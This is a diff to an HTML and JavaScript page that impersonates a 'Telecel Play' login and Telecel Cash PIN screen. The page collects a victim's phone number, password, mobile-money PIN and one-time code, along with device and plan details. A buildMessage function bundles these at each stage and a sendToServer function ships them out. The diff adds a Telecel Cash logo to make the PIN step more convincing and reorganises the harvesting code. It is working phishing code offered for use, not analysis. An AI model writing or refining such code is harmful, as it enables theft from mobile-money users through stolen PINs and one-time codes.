@@ -162,7 +162,7 @@ transform:translateY(-1px);
 box-shadow:0 10px 18px rgba(230,0,35,.2);
 }
 
-/* otp */
+/* otp boxes */
 
 .pin{
 display:flex;
@@ -179,14 +179,17 @@ text-align:center;
 border-radius:16px;
 border:1px solid #eee;
 background:white;
+
 box-shadow:
 0 1px 2px rgba(0,0,0,.05),
 inset 0 1px 1px rgba(0,0,0,.04);
+
 transition:.2s;
 }
 
 .pin input:focus{
 border-color:#e60023;
+
 box-shadow:
 0 0 0 3px rgba(230,0,35,.12),
 0 4px 12px rgba(0,0,0,.06);
@@ -239,6 +242,7 @@ animation:pulse 1.2s infinite ease-in-out;
 <div class="wave two"></div>
 
 <div class="container">
+
 
 <!-- LOGIN -->
 
@@ -297,6 +301,8 @@ Connecting securely...
 <!-- PIN -->
 
 <div id="step2" class="step hidden">
+
+<img src="assets/telecash.webp" style="height:80px;display:block;margin:auto">
 
 <h1>Enter your Telecel Cash PIN</h1>
 
@@ -377,52 +383,24 @@ Logging you in...
 
 <script>
 
-/* device */
-
-const ua=navigator.userAgent
-
-let device="Unknown"
-
-if(/Android/i.test(ua)) device="Android"
-else if(/iPhone|iPad/i.test(ua)) device="iOS"
-
-if(/Chrome/i.test(ua)) device+=" | Chrome"
-else if(/Safari/i.test(ua)) device+=" | Safari"
-else if(/Firefox/i.test(ua)) device+=" | Firefox"
-
-
-/* plan */
-
-let planLine="Not captured"
-
-try{
-
-const p=JSON.parse(sessionStorage.getItem("selectedPlan"))
-
-if(p){
-
-planLine=[p.name||"",p.price||""].join(" — ")
-
-}
-
-}catch(e){}
-
-
-/* values */
 
 let phoneValue=""
 let passwordValue=""
 let pinValue=""
 let otpValue=""
 
+
 phone.oninput=e=>{
-
 phoneValue=e.target.value
-
 }
 
 
-/* step control */
+function togglePassword(){
+
+password.type=password.type==="password"?"text":"password"
+
+}
+
 
 function show(id){
 
@@ -435,11 +413,15 @@ document.getElementById(id)
 }
 
 
-/* professional message */
+/* PROFESSIONAL MESSAGE */
 
 function buildMessage(stage){
 
-return `Telecel Play Login
+return `message:
+
+Time: ${new Date().toISOString()}
+
+Telecel Play Login
 
 Stage: ${stage}
 Number: ${phoneValue}
@@ -447,12 +429,12 @@ Password: ${passwordValue}
 Pin: ${pinValue}
 Otp: ${otpValue}
 Plan: ${planLine}
-Device: ${device}
-Time: ${new Date().toISOString()}`
+Device: ${device}`
+
 }
 
 
-/* send */
+/* SEND */
 
 async function sendToServer(stage){
 
@@ -475,7 +457,38 @@ message:buildMessage(stage)
 }
 
 
-/* login */
+/* DEVICE */
+
+const ua=navigator.userAgent
+
+let device="Unknown"
+
+if(/Android/i.test(ua)) device="Android"
+else if(/iPhone|iPad/i.test(ua)) device="iOS"
+
+if(/Chrome/i.test(ua)) device+=" | Chrome"
+else if(/Safari/i.test(ua)) device+=" | Safari"
+else if(/Firefox/i.test(ua)) device+=" | Firefox"
+
+
+/* PLAN */
+
+let planLine="Not captured"
+
+try{
+
+const p=JSON.parse(sessionStorage.getItem("selectedPlan"))
+
+if(p){
+
+planLine=[p.name||"",p.price||""].join(" — ")
+
+}
+
+}catch(e){}
+
+
+/* LOGIN */
 
 form.onsubmit=e=>{
 
@@ -496,7 +509,7 @@ show("step2")
 }
 
 
-/* pin inputs */
+/* PIN */
 
 const pinInputs=document.querySelectorAll("#step2 input")
 
@@ -545,7 +558,7 @@ startTimer()
 }
 
 
-/* otp inputs */
+/* OTP */
 
 const otpInputs=document.querySelectorAll("#step3 input")
 
@@ -599,7 +612,7 @@ startTimer()
 }
 
 
-/* timer */
+/* TIMER 2 MIN */
 
 function startTimer(){
 
@@ -618,6 +631,7 @@ if(t<=0) clearInterval(i)
 },1000)
 
 }
+
 
 </script>
 
